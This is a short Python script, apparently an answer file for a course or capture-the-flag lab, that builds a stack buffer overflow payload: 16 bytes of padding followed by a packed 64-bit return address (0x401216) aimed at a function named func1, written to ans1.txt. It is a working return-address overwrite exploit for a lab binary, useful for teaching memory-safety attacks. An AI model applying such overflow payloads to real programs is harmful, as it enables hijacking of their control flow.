import struct
  
# 1. 构造 Padding：8字节Buffer + 8字节Saved RBP
padding = b'A' * 16

# 2. 目标地址 func1 = 0x401216
func1_addr = 0x401216

# 3. 将地址打包为64位小端序
payload = padding + struct.pack("<Q", func1_addr)

with open("ans1.txt", "wb") as f:
    f.write(payload)

print("Payload written to ans1.txt")
